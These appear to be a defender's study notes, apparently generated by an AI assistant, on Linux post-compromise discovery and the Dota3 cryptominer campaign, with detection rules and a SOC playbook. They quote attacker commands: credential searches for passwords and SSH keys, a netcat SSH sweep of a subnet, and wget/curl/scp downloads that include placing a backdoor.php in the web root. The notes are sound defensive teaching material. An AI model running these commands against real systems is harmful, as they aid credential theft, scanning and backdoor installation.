
# Linux Discovery & “Hack-and-Forget” Attack — Key Points

## Quick overview: attack flow (3 stages)

1. **Automated initial access** — botnet scans/brute-forces (SSH, etc.).
    
2. **Human takeover** — attacker logs in and runs interactive discovery.
    
3. **Manual follow-up** — persistence, lateral movement, payload install (e.g., cryptominer).
    
![[Pasted image 20251111114026.png]]

---

## First actions attackers run (common discovery commands)

- **OS & env**: `pwd`, `ls /`, `env`, `uname -a`, `lsb_release -a`, `hostname`
    
- **User & creds**: `whoami`, `id`, `w`, `last`, `cat /etc/passwd`, `cat /etc/sudoers`
    
- **Processes & net**: `ps aux`, `top`, `ip a`, `ip r`, `ss -tnlp`, `netstat -tnlp`, `arp -a`
    
- **Sandbox/cloud checks**: `systemd-detect-virt`, `lsmod`, `uptime`, `pgrep "<EDR-or-sandbox>"`
    

**Red flag:** `whoami` — rarely used by legit services; consider alerting on unexpected executions.

---

## Specialized discovery by attacker goal

- **Credential harvesters**: `history | grep pass`, `find / -name .env`, `find /home -name id_rsa`
    
- **Crypto miners**: `cat /proc/cpuinfo`, `lscpu`, `free -m`, `top`
    
- **Botnet scanners**: `for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22; done`, `ping <ip>`
    

---

## Ingress Tool Transfer — how files arrive

- **wget** — `wget https://... -O /tmp/file`
    
- **curl** — `curl --output /var/www/html/backdoor.php "https://..."`
    
- **ssh/scp/sftp** — `scp attacker@host:/path ./local` (can be run from attacker or victim)
    

**Detection nuance:** If attacker pushes via SCP from their machine, victim’s process logs won’t show `scp` — you will see a new SSH login in auth logs.

![[Pasted image 20251111114106.png]]

---

## Useful log sources to monitor

- **Auditd / process creation events** — execve entries for discovery & transfer commands.
    
- **/var/log/auth.log (or syslog equivalents)** — SSH successful/failed logins, new keys, password auth.
    
- **File monitoring** — new files in `/tmp`, strange hidden directories (e.g. `/tmp/.X26-unix`), files named like `dota3.tar.gz`.
    
- **Network monitoring / proxy logs** — downloads from suspicious domains/IPs, outbound SSH/SCP to unusual hosts.
    
- **EDR/antivirus** — detection of known miner binaries (xmr/xmrig), suspicious persistence changes.
    

---

## Typical attacker persistence & post-exploit behaviors

- Change passwords programmatically (`passwd` with stdin).
    
- Replace `.ssh/authorized_keys` with attacker key (unique comments like `mdrfckr` can be IOCs).
    
- Create hidden staging dirs under `/tmp` and run binaries with `nohup` so they survive session close.
    

---

## Dota3 quick case study (condensed)

- **Initial access**: botnet brute-forces SSH (root/top 1000 passwords).
    
- **Discovery**: quick CPU/RAM checks → indicates likely cryptominer.
    
- **Persistence**: password change + `.ssh` replacement (locks out owner).
    
- **Ingress & staging**: upload `dota3.tar.gz` → extract to `/tmp/.X26-unix/...` → run `tsm` (scanner) and `initall` (xmrig miner) with `nohup`.
    
- **Detection signals**: SSH logins from malicious IPs; auditd execs of `lscpu`/`free`/`whoami`; file creations in `/tmp` with odd names; scanning traffic (SSH probes across internal subnets); `nohup` usage spawning long-running unfamiliar binaries.
    

---

## Actionable SIEM/Detection rules (suggested)

1. **Alert:** any `whoami` executed by a webserver process (nginx/apache/php-fpm).
    
2. **Alert:** new file creation in `/tmp` or `/var/tmp` with names matching `*.tar.gz` or hidden dirs starting `.` and unusual structure.
    
3. **Alert:** `wget`/`curl`/`scp` executed by non-admin users or from unexpected parent processes.
    
4. **Alert:** sudden `passwd` changes for non-admin or service accounts.
    
5. **Alert:** `authorized_keys` modified and the key comment contains unusual strings (e.g., `mdrfckr`).
    
6. **Alert:** processes launched with `nohup` from `/tmp` or by non-standard users.
    
7. **Alert:** network scan patterns (sequential SSH attempts across local ranges).
    
8. **Correlate:** SSH login success from external IPs with subsequent creation of hidden `/tmp` directories.
    

---

## Quick SOC playbook (investigate & respond)

1. **Triage** — correlate `auth.log` (SSH) + auditd exec events + file creation times.
    
2. **Contain** — block malicious IPs, disable compromised user accounts, remove attacker keys from `~/.ssh/authorized_keys` (after collecting evidence).
    
3. **Hunt** — search for hidden `/tmp` dirs, unknown binaries, cron entries, and persistence artifacts.
    
4. **Eradicate** — kill malicious processes, remove artifacts, rotate credentials and SSH keys, patch weak passwords.
    
5. **Recover** — restore from known-good backups if system integrity is uncertain; harden SSH (key-only auth, disable root login, 2FA, rate-limit).
    
6. **Post-incident** — threat intel enrichment for attacker IPs/domains; update detection rules (add IOCs discovered).
    

---

## Quick checklist (one-liner signals to watch)

- Unusual `whoami` / `id` executions.
    
- `wget`/`curl` to external/public hosting (GitHub/pastebin) followed by new `/tmp` files.
    
- New `authorized_keys` entries with odd comments.
    
- Long-running unknown binaries started with `nohup`.
    
- Internal SSH scans (192.168.* / 172.16.*).
    
- Password change commands executed non-interactively.
    

---

If you want, I can:

- convert this into a one-page printable cheat-sheet (PDF/Markdown), or
    
- produce Splunk/SIEM rule examples (ELK, Sigma, Splunk) for the detection rules above, or
    
- generate a small timeline template for Dota3-style incidents.
    

Which of those do you want next?